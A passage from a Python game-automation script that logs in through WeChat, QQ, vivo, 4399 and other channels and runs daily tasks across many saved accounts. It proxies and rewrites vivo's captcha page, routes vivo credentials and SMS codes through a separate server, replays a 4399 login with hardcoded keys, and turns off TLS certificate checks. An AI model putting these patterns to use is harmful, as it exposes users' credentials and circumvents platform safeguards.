                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length) if content_length > 0 else None

                    headers = {}
                    for key, val in self.headers.items():
                        if key.lower() not in ('host', 'content-length', 'connection'):
                            headers[key] = val

                    headers['Referer'] = 'https://captcha.vivo.com.cn/'
                    headers['Origin'] = 'https://captcha.vivo.com.cn'

                    resp = login_self.session.request(
                        self.command,
                        target_url,
                        data=body,
                        headers=headers,
                        timeout=30,
                        allow_redirects=True
                    )

                    self.send_response(resp.status_code)
                    for key, val in resp.headers.items():
                        if key.lower() not in ('content-encoding', 'transfer-encoding', 'connection', 'content-length'):
                            self.send_header(key, val)
                    self.send_header('Content-Length', str(len(resp.content)))
                    self.end_headers()
                    self.wfile.write(resp.content)
                    return True
                except Exception as e:
                    try:
                        self.send_response(500)
                        self.end_headers()
                        self.wfile.write(str(e).encode())
                    except:
                        pass
                    return False

            def do_GET(self):
                parsed = _urlparse.urlparse(self.path)

                if parsed.path == '/captcha_page':

                    meta_str = _urlparse.quote(json.dumps(login_self._captcha_meta))
                    target_url = f"{login_self.server_url}/vivo_native/captcha?state={login_self.state}&kind={login_self._captcha_kind}&meta={meta_str}"

                    resp = login_self.session.get(target_url, timeout=30)
                    html = resp.text

                    sdk_original = 'https://captcha.vivo.com.cn/'
                    sdk_proxied = f'{base_prefix}/proxy?url={_urlparse.quote(sdk_original, safe="")}'
                    html = html.replace(sdk_original, sdk_proxied)

                    html = html.replace(
                        '"apiServer":"https://captcha.vivo.com.cn"',
                        f'"apiServer":"{base_prefix}/proxy?url={_urlparse.quote("https://captcha.vivo.com.cn", safe="")}"'
                    )

                    html = html.replace(
                        "'/vivo_native/captcha_done'",
                        f"'{base_prefix}/captcha_done'"
                    )
                    html = html.replace(
                        '"/vivo_native/captcha_done"',
                        f'"{base_prefix}/captcha_done"'
                    )

                    html = html.replace(
                        '<head>',
                        '<head><base href="https://captcha.vivo.com.cn/">'
                    )

                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(html.encode('utf-8'))

                elif parsed.path == '/proxy':

                    query = _urlparse.parse_qs(parsed.query)
                    target_url = query.get('url', [''])[0]
                    if target_url:

                        if parsed.query:

                            raw_query = parsed.query
                            if raw_query.startswith('url='):
                                url_part = raw_query[4:]

                                amp_pos = url_part.find('&')
                                if amp_pos >= 0:
                                    base_url = _urlparse.unquote(url_part[:amp_pos])
                                    extra_params = url_part[amp_pos+1:]
                                    target_url = base_url
                                    if extra_params:
                                        if '?' in target_url:
                                            target_url += '&' + extra_params
                                        else:
                                            target_url += '?' + extra_params
                                else:
                                    target_url = _urlparse.unquote(url_part)
                        self._proxy(target_url)
                    else:
                        self.send_response(400)
                        self.end_headers()

                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                parsed = _urlparse.urlparse(self.path)

                if parsed.path == '/captcha_done':

                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length)

                    headers = {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Referer': f'{login_self.server_url}/vivo_native/captcha',
                        'Origin': login_self.server_url,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'X-Requested-With': 'XMLHttpRequest',
                    }

                    resp = login_self.session.post(
                        f"{login_self.server_url}/vivo_native/captcha_done",
                        data=body,
                        headers=headers,
                        timeout=30
                    )

                    result = resp.json()
                    login_self._captcha_done = True
                    login_self._captcha_result = result

                    print(f"{Color.CYAN}[调试] captcha_done响应: {json.dumps(result, ensure_ascii=False)[:200]}{Color.RESET}")

                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(resp.content)

                elif parsed.path == '/proxy':

                    query = _urlparse.parse_qs(parsed.query)
                    target_url = query.get('url', [''])[0]
                    if target_url:
                        raw_query = parsed.query
                        if raw_query.startswith('url='):
                            url_part = raw_query[4:]
                            amp_pos = url_part.find('&')
                            if amp_pos >= 0:
                                base_url = _urlparse.unquote(url_part[:amp_pos])
                                extra_params = url_part[amp_pos+1:]
                                target_url = base_url
                                if extra_params:
                                    if '?' in target_url:
                                        target_url += '&' + extra_params
                                    else:
                                        target_url += '?' + extra_params
                            else:
                                target_url = _urlparse.unquote(url_part)
                        self._proxy(target_url)
                    else:
                        self.send_response(400)
                        self.end_headers()

                else:
                    self.send_response(404)
                    self.end_headers()

        server = http.server.HTTPServer(('127.0.0.1', port), ProxyHandler)
        server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        server_thread.start()

        local_url = f"{base_prefix}/captcha_page"
        print(f"请在浏览器中完成验证: {local_url}")

        try:
            webbrowser.open(local_url)
        except:
            pass

        print(f"{Color.CYAN}⏳ 等待验证完成...{Color.RESET}")

        start_time = time.time()
        while time.time() - start_time < 180:
            if self._captcha_done:
                break
            time.sleep(1)

        server.shutdown()

        if not self._captcha_done:
            print(f"{Color.RED}❌ 验证超时{Color.RESET}")
            return None

        time.sleep(3)

        if kind == 'send':

            if self._captcha_result and self._captcha_result.get('ok'):
                print(f"{Color.GREEN}✅ 验证成功，验证码已发送{Color.RESET}")
                return self._input_phone_code()
            else:
                print(f"{Color.RED}❌ 验证失败，请重试{Color.RESET}")
                return None

        elif kind == 'login':
            print(f"{Color.CYAN}⏳ 正在验证...{Color.RESET}")
            return self._input_phone_code()

        elif kind == 'pwd':
            print(f"{Color.GREEN}✅ 验证通过{Color.RESET}")
            return self._load_list()

        return None

    def _poll_status(self, kind, timeout=120):
        """轮询验证状态"""
        start = time.time()
        while time.time() - start < timeout:
            try:
                resp = self._get('/vivo_native/status')
                st = resp.json()

                step = st.get('step', '')

                if step == 'code_sent' and kind == 'send':
                    print(f"{Color.GREEN}✅ 验证通过，短信验证码已发送{Color.RESET}")
                    return 'phone_code_sent'
                elif step == 'need_phone_verify' and kind == 'pwd':
                    print(f"{Color.GREEN}✅ 滑块验证通过，账号需验证手机号{Color.RESET}")
                    return 'need_phone_verify'
                elif step == 'logged' and kind in ('pwd', 'login'):
                    print(f"{Color.GREEN}✅ 验证通过，登录成功{Color.RESET}")
                    return 'logged'

                time.sleep(1.5)
            except Exception as e:
                time.sleep(1)

        print(f"{Color.RED}❌ 验证超时{Color.RESET}")
        return None

    def _phone_verify(self):
        """手机验证 - 发送短信验证码"""
        print(f"{Color.CYAN}📨 正在发送短信验证码...{Color.RESET}")
        try:
            resp = self._post('/vivo_native/sms_send', data={'phone': self.phone})
            data = resp.json()

            if data.get('need_captcha'):
                return self._handle_captcha(data, 'send')

            if data and data.get('ok'):
                print(f"{Color.GREEN}✅ {data.get('msg', '验证码已发送')}{Color.RESET}")
                return self._input_phone_code()

            print(f"{Color.RED}❌ 发送失败: {data.get('error', '未知错误')}{Color.RESET}")
            return None
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def _input_phone_code(self):
        """输入手机验证码"""
        code = input("请输入短信验证码: ").strip()
        if not code:
            return None

        try:
            print(f"{Color.CYAN}⏳ 验证中...{Color.RESET}")
            resp = self._post('/vivo_native/sms_verify', data={'phone': self.phone, 'code': code})
            data = resp.json()

            if data.get('need_captcha'):
                return self._handle_captcha(data, 'login')

            if data and data.get('ok'):
                print(f"{Color.GREEN}✅ 验证通过，登录成功!{Color.RESET}")
                return self._load_list()

            print(f"{Color.RED}❌ 验证失败: {data.get('error', '未知错误')}{Color.RESET}")
            return None
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def _load_list(self):
        """加载账号列表"""
        try:
            resp = self._post('/vivo_native/list')
            data = resp.json()

            if not data or data.get('error'):
                print(f"{Color.RED}❌ 获取账号列表失败: {data.get('error', '未知错误')}{Color.RESET}")
                return None

            account_list = data.get('list', [])
            if not account_list:
                print(f"{Color.RED}❌ 未找到账号{Color.RESET}")
                return None

            print(f"\n{Color.CYAN}📋 账号列表:{Color.RESET}")
            for i, acc in enumerate(account_list, 1):
                print(f"  {i}. #{acc.get('idx', '')} {acc.get('type', '')} {acc.get('name', '')}")

            sel = input("请选择账号序号: ").strip()
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(account_list):
                    sub = account_list[idx].get('subOpenId', '')
                    return self._finish(sub)
                else:
                    print(f"{Color.RED}❌ 序号无效{Color.RESET}")
                    return None
            except ValueError:
                print(f"{Color.RED}❌ 请输入数字{Color.RESET}")
                return None
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def _finish(self, sub):
        """提取oi/t"""
        try:
            print(f"{Color.CYAN}⏳ 提取 oi/t...{Color.RESET}")
            resp = self._post('/vivo_native/finish', data={'sub': sub})
            data = resp.json()

            if data.get('oi') and data.get('t'):
                print(f"{Color.GREEN}✅ 已获得 oi/t!{Color.RESET}")
                self.result = data
                self._print_result("vivo登录信息", [
                    ('oi', 'oi'),
                    ('t', 't'),
                ], data)
                return data

            print(f"{Color.RED}❌ 提取失败: {data.get('error', json.dumps(data)[:200])}{Color.RESET}")
            return None
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def login(self):
        """vivo登录"""
        print(f"\n{Color.CYAN}===== vivo登录 ====={Color.RESET}")
        print(" 1. vivo账密登录")
        print(" 2. vivo短信验证码登录")
        mode = input("请选择登录方式 (1-2): ").strip()

        if mode == '1':
            account = input("请输入账号/手机号: ").strip()
            password = input("请输入密码: ").strip()
            if account and password:
                return self.password_login(account, password)
        elif mode == '2':

            phone = input("请输入手机号: ").strip()
            if phone:
                self.phone = phone
                return self._phone_verify()

        return None

def _login_by_third_party():
    """第三方登录 - 使用Python内置登录，无需打开浏览器"""
    print(f"\n{C.C}===== 第三方登录 ====={C.R}")
    print(f"\n{C.C}支持的渠道：{C.R}")
    print(" 1. 微信扫码登录")
    print(" 2. QQ登录")
    print(" 3. 小米登录")
    print(" 4. TapTap短信登录")
    print(" 5. 华为登录")
    print(" 6. 荣耀登录")
    print(" 7. OPPO登录")
    print(" 8. vivo登录")
    print(" （回车返回）")
    c = input("\n请选择渠道: ").strip()
    if not c:
        return None

    try:
        login_obj = None
        result = None

        if c == "1":

            login_obj = WeChatLogin()
            result = login_obj.login(open_browser=True)
        elif c == "2":

            login_obj = QQLogin()
            result = login_obj.login(open_browser=True)
        elif c == "3":

            login_obj = XiaomiLogin()
            result = login_obj.login(open_browser=True)
        elif c == "4":

            login_obj = TapTapLogin()
            result = login_obj.login()
        elif c == "5":

            login_obj = HuaweiLogin()
            result = login_obj.login()
        elif c == "6":

            login_obj = HonorLogin()
            result = login_obj.login()
        elif c == "7":

            login_obj = OPPOLogin()
            result = login_obj.login()
        elif c == "8":

            login_obj = VivoLogin()
            result = login_obj.login()
        else:
            print(f"{C.RED}无效的渠道选择{C.R}")
            return None

        if not result or not login_obj or not login_obj.result:
            print(f"{C.RED}登录失败{C.R}")
            return None

        data = login_obj.result

        channel_name_map = {
            "1": "微信", "2": "QQ", "3": "小米", "4": "TapTap",
            "5": "华为", "6": "荣耀", "7": "OPPO", "8": "vivo"
        }
        ch_name = channel_name_map.get(c, "第三方")

        if c == "1":

            if "atk" in data and "openid" in data:
                cfg = {"atk": data["atk"], "openid": data["openid"], "code": "微信"}
                print(f"{C.G}微信登录材料转换成功{C.R}")
                return cfg
            else:
                print(f"{C.RED}微信登录材料缺少 atk 或 openid{C.R}")
                return None
        elif c == "2":

            if "oi" in data and "access_token" in data:
                cfg = {"oi": data["oi"], "access_token": data["access_token"], "code": "QQ"}
                print(f"{C.G}QQ登录材料转换成功{C.R}")
                return cfg
            else:
                print(f"{C.RED}QQ登录材料缺少 oi 或 access_token{C.R}")
                return None
        else:

            if isinstance(data, dict) and data:
                data["code"] = ch_name
                print(f"{C.G}{ch_name}登录材料转换成功{C.R}")
                return data
            else:
                print(f"{C.RED}登录材料为空或格式不正确{C.R}")
                return None

    except Exception as e:
        print(f"{C.RED}登录出错: {e}{C.R}")
        import traceback
        traceback.print_exc()
        return None

def _convert_third_party_login(channel, data):
    channel_map = {
        "1": "微信", "2": "QQ", "3": "OPPO", "4": "小米",
        "5": "TapTap", "6": "vivo", "7": "华为", "8": "荣耀"
    }
    ch = channel_map.get(channel, "")
    print(f"{C.C}正在转换 {ch} 登录材料...{C.R}")

    if channel == "1":
        if "atk" in data and "openid" in data:
            return {"atk": data["atk"], "openid": data["openid"]}
        else:
            print(f"{C.RED}微信登录材料需要包含 atk 和 openid 字段{C.R}")
            return None

    elif channel == "2":
        if "oi" in data and "access_token" in data:
            return {"oi": data["oi"], "access_token": data["access_token"]}
        else:
            print(f"{C.RED}QQ登录材料需要包含 oi 和 access_token 字段{C.R}")
            return None

    else:
        if isinstance(data, dict) and data:
            return data
        else:
            print(f"{C.RED}登录材料为空或格式不正确{C.R}")
            return None

def _login_4399_by_account():
    """4399账号密码自动登录，无需抓包"""
    print(f"\n{C.C}===== 4399账号密码登录 ====={C.R}")

    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
    except ImportError:
        print(f"{C.Y}正在安装pycryptodome...{C.R}")
        try:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "-q"])
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            print(f"{C.G}pycryptodome安装成功{C.R}")
        except Exception as e:
            print(f"{C.RED}pycryptodome安装失败: {e}{C.R}")
            print(f"{C.Y}请手动运行: pip install pycryptodome{C.R}")
            return None

    username = input("4399账号：").strip().replace(" ", "")
    if not username:
        return None
    password = input("4399密码：").strip().replace(" ", "")
    if not password:
        return None

    print(f"{C.C}正在登录...{C.R}")

    ENV = "RUaEpU4PBRE9+xWdHKzcGqbLwAqEQYsFm0pT6k911w7+yD0fKfErma4LLefTlzrU8I3oKm3V++f1Qe9JJO/ynwHePaAyZkwg6QRLmkYEOCQN+FtkTztIMc+gUun9oq+tQCgS57/J6ZBwF7JE2A0zlTDBsNFnbiKHTz5SXGkllJpBPwoBXar1ME3MWKHZdHmp8w9P5nxnSNxCAX+QX56+PR0bbzTsAYMzcJJqmaFCSkGwFK7JynljUmQs6oi5Ixh05uRrCufBgIHgcQWJnNY2/8wjhDOXUh8WO3Csio48gcVVmnjplDQT+hzfF5Oz9vPEl+VDmH+X+1hH1ZTwZXN9n0xNtanTg4JVOEDCy9ptsYmBuYTeNEiyJLZxizTxjTx3aRG/3gGrwoGQl0X47JeGHgMsF3AL/WnB1ejJsTHDSORN3vExFzOi17il64VazIINh0waEZnu7/YhtE3xNV5qGD9FSowf7/m5AwpzzJAUqx1hh2pjISwqkI3sr3o9hndcM/SEgAGnQUMTykNoqk3Kh1DcZAN1mLPaEJ+jAUJvtbxrVBSbcJRh6IY4WHN3bLp+5MTm28q5GlhySOZ6ue0p9YHzBSlq94d1lxaSGaulXUd51QWP+MUsGqcl4/yBQJL05Q36g4mOLfMCkkYj5JVe2Hl1DqDPRKHW1MsRUBoO9NDIWlNzg/CosY9JkreEcu0V0VdsbiGFFqfBGJkbHKEaHfb/TShalZolsVRJjchiTZ80mPQ2KRr/g6fnIYLyETJMdQM3GyBevHwuKY7BSrbLJtRa8v3WGAwl6ZA6iLkIaP4tvFy6Jslh+OBEnUEJMlO4dZar07qlu+MMmrB8UvU7VzC+7BABS6DqFlchCYXkphviSyG6XI06MbIGWv9xC4Eg"
    AES_KEY = "lzYW5qaXVqa"

    import ssl as _ssl
    import http.cookiejar as _cookiejar
    import urllib.request as _urllib_request
    import urllib.parse as _urllib_parse

    _ctx = _ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = _ssl.CERT_NONE

    def _get_headers(referer=None):
        h = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; MI 9 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "keep-alive",
        }
        if referer:
            h["Referer"] = referer
            h["Origin"] = "https://ptlogin.4399.com"
        return h

    def _evp_bytes_to_key(password, salt, key_len=32, iv_len=16):
        dtot = b""
        d = b""
        while len(dtot) < key_len + iv_len:
            d = hashlib.md5(d + password + salt).digest()
            dtot += d
        return dtot[:key_len], dtot[key_len:key_len + iv_len]

    def _aes_encrypt(plaintext, passphrase):
        salt = os.urandom(8)
        key, iv = _evp_bytes_to_key(passphrase.encode('utf-8'), salt)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded = pad(plaintext.encode('utf-8'), AES.block_size)
        encrypted = cipher.encrypt(padded)
        result = b"Salted__" + salt + encrypted
        return base64.b64encode(result).decode('utf-8')

    def _extract_hidden_fields(html):
        hidden_inputs = re.findall(r'<input[^>]*type="hidden"[^>]*>', html, re.IGNORECASE)
        form_data = {}
        for inp in hidden_inputs:
            name_m = re.search(r'name="([^"]*)"', inp)
            value_m = re.search(r'value="([^"]*)"', inp)
            if name_m:
                name = name_m.group(1)
                value = value_m.group(1) if value_m else ""
                if name not in form_data:
                    form_data[name] = value
        return form_data

    class _NoRedirect(_urllib_request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    try:
        cookie_jar = _cookiejar.CookieJar()
        opener = _urllib_request.build_opener(
            _urllib_request.HTTPSHandler(context=_ctx),
            _urllib_request.HTTPCookieProcessor(cookie_jar)
        )

        oauth_url = "https://m.4399api.com/openapiv2/oauth.html"
        params = {"env": ENV}
        data = _urllib_parse.urlencode(params).encode("utf-8")
        h = _get_headers()
        h["Content-Type"] = "application/x-www-form-urlencoded"
        req = _urllib_request.Request(oauth_url, data=data, headers=h)
        resp = opener.open(req, timeout=15)
        result = json.loads(resp.read().decode("utf-8", errors="ignore"))
        login_url = result.get("result", {}).get("login_url", "")
        if not login_url:
            print(f"{C.RED}登录失败：获取登录页URL失败{C.R}")
            return None

        req2 = _urllib_request.Request(login_url, headers=_get_headers())
        resp2 = opener.open(req2, timeout=15)
        html2 = resp2.read().decode("utf-8", errors="ignore")
        current_url = resp2.geturl()
        form_data = _extract_hidden_fields(html2)

        submit_data = dict(form_data)
        submit_data["auth_action"] = "ORILOGIN"
        submit_data["username"] = ""
        for k in ["phone", "phone_captcha"]:
            submit_data.pop(k, None)
        data_str = _urllib_parse.urlencode(submit_data).encode("utf-8")
        h3 = _get_headers(referer=current_url)
        h3["Content-Type"] = "application/x-www-form-urlencoded"
        req3 = _urllib_request.Request("https://ptlogin.4399.com/oauth2/authorize.do", data=data_str, headers=h3)
        resp3 = opener.open(req3, timeout=15)
        html3 = resp3.read().decode("utf-8", errors="ignore")
        current_url3 = resp3.geturl()
        form_data3 = _extract_hidden_fields(html3)
        if 'type="password"' not in html3 and "type='password'" not in html3:
            print(f"{C.RED}登录失败：切换账号密码登录失败{C.R}")
            return None

        encrypted_pwd = _aes_encrypt(password, AES_KEY)
        login_data = dict(form_data3)
        login_data["username"] = username
        login_data["password"] = encrypted_pwd
        login_data["sec"] = "1"
        login_data["isInputRealname"] = "false"
        login_data["isValidRealname"] = "false"
        login_data["auth_action"] = "ORILOGIN"
        data_str = _urllib_parse.urlencode(login_data).encode("utf-8")
        h4 = _get_headers(referer=current_url3)
        h4["Content-Type"] = "application/x-www-form-urlencoded"
        req4 = _urllib_request.Request("https://ptlogin.4399.com/oauth2/loginAndAuthorize.do", data=data_str, headers=h4)

        opener_no_redirect = _urllib_request.build_opener(
            _urllib_request.HTTPSHandler(context=_ctx),
            _urllib_request.HTTPCookieProcessor(cookie_jar),
            _NoRedirect()
        )

        try:
            resp4 = opener_no_redirect.open(req4, timeout=15)
            status = resp4.getcode()
            location = resp4.headers.get("Location", "")
            html4 = resp4.read().decode("utf-8", errors="ignore")
        except Exception as e4:
            if hasattr(e4, 'code') and e4.code in (301, 302, 303, 307, 308):
                status = e4.code
                location = e4.headers.get("Location", "")
                html4 = ""
            else:
                print(f"{C.RED}登录请求异常: {e4}{C.R}")
                return None

        if status == 200:
            if "密码错误" in html4 or "账号或密码" in html4:
                print(f"{C.RED}账号或密码错误{C.R}")
                return None
            if "频繁" in html4 or "稍后再试" in html4:
                print(f"{C.RED}登录频繁，请稍后再试{C.R}")
                return None
            err_m = re.search(r'id="login_err_msg"[^>]*>(.*?)</p>', html4, re.DOTALL)
            if err_m and err_m.group(1).strip():
                print(f"{C.RED}登录失败: {err_m.group(1).strip()}{C.R}")
                return None

        if status not in (301, 302, 303, 307, 308) or not location:
            print(f"{C.RED}登录失败，状态码: {status}{C.R}")
            return None

        parsed = _urllib_parse.urlparse(location)
        query_params = _urllib_parse.parse_qs(parsed.query)
        refresh_token = query_params.get("refresh_token", [None])[0]
        uid = query_params.get("uid", [""])[0]
        nick = query_params.get("nick", [""])[0]

        if not refresh_token:
            print(f"{C.RED}登录失败：未获取到登录令牌{C.R}")
            return None

        info_url = "https://m.4399api.com/openapiv2/oauth-getinfobyrefresh.html"
        info_params = {
            "refresh_token": refresh_token,
            "gamekey": "46619",
            "game_key": "124642",
            "env": ENV,
        }
        info_data = _urllib_parse.urlencode(info_params).encode("utf-8")
        h5 = _get_headers()
        h5["Content-Type"] = "application/x-www-form-urlencoded"
        req5 = _urllib_request.Request(info_url, data=info_data, headers=h5)
        resp5 = opener.open(req5, timeout=15)
        info_result = json.loads(resp5.read().decode("utf-8", errors="ignore"))

        if info_result.get("code") != 200 or "result" not in info_result:
            print(f"{C.RED}登录失败：获取用户信息失败{C.R}")
            return None

        user_info = info_result["result"]
        state = user_info.get("state", "")
        if not state:
            print(f"{C.RED}登录失败：用户信息无效{C.R}")
            return None

        if not uid:
            uid = str(user_info.get("uid", ""))
        if not nick:
            nick = user_info.get("nick", "")

        content_str = json.dumps({
            "channelUserInfo": {
                "channelUserId": str(uid),
                "loginToken": state
            },
            "loginIdentity": str(uid),
            "id": int(uid) if str(uid).isdigit() else uid,
            "nick": nick
        }, ensure_ascii=False)

        cfg = {"code": "0000", "content": content_str}
        print(f"{C.G}4399登录成功{C.R}")
        return cfg

    except Exception as e:
        print(f"{C.RED}4399登录异常: {e}{C.R}")
        import traceback
        traceback.print_exc()
        return None

def run_yijian():
    if not session.logged_in:
        print(f"{C.RED}请先登入{C.R}"); return
    try:
        tuoz(); sptuoz(); run_first_script(); yijian()
    except Exception as e:
        print(f"{C.RED}一键日常出错：{e}{C.R}")
        import traceback
        traceback.print_exc()

def run_batch_yanghao():
    """批量养号：遍历所有已保存账号，逐个登录并执行一键日常"""
    accounts = load_accounts()
    if not accounts:
        print(f"{C.RED}没有已保存的账号，请先登入账号{C.R}")
        return
    print(f"\n{C.C}===== 批量养号（共 {len(accounts)} 个账号）====={C.R}")
    results = []
    for idx, acc in enumerate(accounts, 1):
        name = acc.get("name", "") or acc.get("nickname", "") or f"账号{idx}"
        ui = acc.get("ui", "")
        platform = acc.get("platform", "")
        print(f"\n{C.C}----- [{idx}/{len(accounts)}] {name} (ui={ui}, {platform}) -----{C.R}")
        try:
            cfg = acc.get("cfg", {})
            nc = get_login_config(cfg)
            if not nc:
                print(f"{C.RED}登录配置无效，跳过{C.R}")
                results.append((name, "登录配置无效"))
                continue
            import io as _io
            from contextlib import redirect_stdout as _rso
            buf = _io.StringIO()
            login_ok = False
            try:
                with _rso(buf):
                    login_ok = bool(session.login(nc))
            except Exception:
                login_ok = False
            if not login_ok:
                print(f"{C.RED}登录失败，跳过{C.R}")
                results.append((name, "登录失败"))
                continue
            print(f"{C.G}登录成功{C.R}")
            global _RUNTIME_CONFIG
            _RUNTIME_CONFIG = cfg
            import builtins as _builtins
            _orig_input = _builtins.input
            _builtins.input = lambda *a, **k: ""
            task_results = []

            _orig_do_post = _do_post
            def _patched_do_post(head, encrypted_data, plain_data, max_ek_retry=3):
                _res = _orig_do_post(head, encrypted_data, plain_data, max_ek_retry)
                if pingtai != 'ios':
                    time.sleep(0.25)
                return _res
            globals()['_do_post'] = _patched_do_post
            for _task_name, _task_fn in [("转盘", tuoz), ("碎片转盘", sptuoz), ("7天签到", run_first_script), ("一键日常", yijian)]:
                print(f"\n  {C.C}--- {_task_name} ---{C.R}")
                try:
                    _task_fn()
                    task_results.append((_task_name, "成功"))
                except Exception as _e:
                    _err_detail = f"{type(_e).__name__}: {_e}"
                    task_results.append((_task_name, f"出错({_err_detail})"))
                    print(f"  {C.RED}{_task_name}出错: {_err_detail}{C.R}")
            globals()['_do_post'] = _orig_do_post
            _builtins.input = _orig_input
            _success_tasks = sum(1 for _, s in task_results if s == "成功")
            _fail_tasks = len(task_results) - _success_tasks
            if _fail_tasks == 0:
                results.append((name, f"成功（{_success_tasks}/{len(task_results)}项全成）"))
            else:
                _failed_names = [n for n, s in task_results if s != "成功"]
                results.append((name, f"部分成功（{_success_tasks}成{_fail_tasks}败: {','.join(_failed_names)}）"))
        except Exception as e:
            print(f"{C.RED}账号处理异常: {e}{C.R}")
            results.append((name, f"异常: {e}"))
        if idx < len(accounts):
            print(f"  等待10秒后继续下一个账号...")
            time.sleep(10)
    print(f"\n{C.C}===== 批量养号汇总 =====")
    success_count = sum(1 for _, s in results if "成功" in s)
    fail_count = len(results) - success_count
    for i, (name, status) in enumerate(results, 1):
        color = C.G if "成功" in status else C.R
        print(f" {i}. {name}: {color}{status}{C.R}")
    print(f"\n{C.C}共 {len(results)} 个账号，成功 {success_count} 个，失败 {fail_count} 个{C.R}")

def main_entry():
    global _RUNTIME_CONFIG
    session.encrypt_url = _fastest_encrypt_url()
    accounts = load_accounts()
    if accounts and not session.logged_in:
        print(f"\n{C.C}===== 选择账号登录（文本过期会自动删除账号） ====={C.R}")
        import io as _io
        from contextlib import redirect_stdout as _rso
        status_list = []
        for acc in accounts:
            cfg = acc.get("cfg", {})
            buf = _io.StringIO()
            ok = False
            try:
                nc = get_login_config(cfg)
                with _rso(buf):
                    ok = bool(nc and session.login(nc))
            except Exception:
                ok = False
            out = buf.getvalue()
            plat = acc.get("platform", "安卓")
            if "锁IP" in out or "锁ip" in out:
                status_list.append(f"{C.Y}[已锁IP | {plat}]{C.R}")
            elif ok:
                status_list.append(f"{C.G}[文本正常 | {plat}]{C.R}")
            else:
                status_list.append(f"{C.RED}[文本过期 | {plat}]{C.R}")

        expired_indices = [i for i, s in enumerate(status_list) if "文本过期" in s]
        if expired_indices:
            print(f"{C.Y}检测到 {len(expired_indices)} 个文本过期账号，自动删除...{C.R}")

            for idx in sorted(expired_indices, reverse=True):
                delete_account(idx)

            accounts = load_accounts()
            status_list = []
            for acc in accounts:
                cfg = acc.get("cfg", {})
                buf = _io.StringIO()
                ok = False
                try:
                    nc = get_login_config(cfg)
                    with _rso(buf):
                        ok = bool(nc and session.login(nc))
                except Exception:
                    ok = False
                out = buf.getvalue()
                plat = acc.get("platform", "安卓")
                if "锁IP" in out or "锁ip" in out:
                    status_list.append(f"{C.Y}[已锁IP | {plat}]{C.R}")
                elif ok:
                    status_list.append(f"{C.G}[文本正常 | {plat}]{C.R}")
                else:
                    status_list.append(f"{C.RED}[文本过期 | {plat}]{C.R}")

        for i, acc in enumerate(accounts, 1):
            nick_str = f" 昵称:{acc.get('nickname','')}" if acc.get('nickname') else ""
            full_name = _make_account_name(acc['cfg'], acc['ui'], acc['platform'])
            plat_name = full_name.split('-')[0] + '-'
            print(f" {i}. {plat_name}（ui={acc['ui']} {acc['platform']}{nick_str}）{status_list[i-1]}")
        print(" （回车跳过，不登录）")
        sel = input("\n请选择序号: ").strip()
        if sel:
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(accounts):
                    cfg = accounts[idx]["cfg"]
                    nc = get_login_config(cfg)
                    if nc and session.login(nc):
                        try:
                            player_nick = _get_player_nickname()
                        except Exception:
                            player_nick = ""
                        nick_str = f" 昵称:{player_nick}" if player_nick else ""
                        print(f"{C.G}登录成功 | 平台：{session.platform}{nick_str}{C.R}")
                        add_account(cfg, session.ui, session.platform)
                        _RUNTIME_CONFIG = cfg
                    else:
                        print(f"{C.RED}登录态已过期，请重新登录{C.R}")
                else:
                    print(f"{C.RED}序号无效{C.R}")
            except ValueError:
                print(f"{C.RED}请输入数字{C.R}")
    main_items = [(k, t) for k, t in CATEGORIES] + [
        ("jiangbo", "僵博挑战"),
        ("chouhongbao", "抽红包"),
        ("quwei", "趣味竞赛"),
        ("yingdi", "周年之约"),
        ("shikong", "时空寻宝"),
        ("panni", "潘妮课堂"),
        ("huigui", "回归有礼"),
        ("daifubei", "戴夫杯"),
        ("soudache", "远征之门"),
        ("peiyu", "植物培育"),
        ("jiangshi_clear", "僵尸清除计划"),
        ("yijian", "一键日常"), ("piyanghao", "批量养号"), ("dengru", "登入账号"), ("exit", "回车:退出")
    ]
    while True:
        idx = _show_menu("主菜单", main_items, fancy=True)
        if idx is None:
            if input("确定退出？（回车退出，输入其他继续）：").strip() == "":
                break
            continue
        key, _ = main_items[idx]
        if key == "yijian":
            run_yijian()
        elif key == "piyanghao":
            run_batch_yanghao()
        elif key == "dengru":
            run_dengru()
        elif key == "exit":
            break
        elif key == "jiangbo":
            run_thirteenth_script()
        elif key == "chouhongbao":
            run_nintieth_fifth_script()
        elif key == "quwei":
            run_fortieth_fifth_script()
        elif key == "yingdi":
            run_eighteenth_script()
        elif key == "shikong":
            run_twenty_fifth_script()
        elif key == "panni":
            run_thirtieth_script()
        elif key == "huigui":
            run_eightieth_second_script()
        elif key == "daifubei":
            daifubei()
        elif key == "soudache":
            soudache()
        elif key == "peiyu":
            run_eightieth_sixth_script()
        elif key == "jiangshi_clear":
            run_eightieth_seventh_script()
        else:
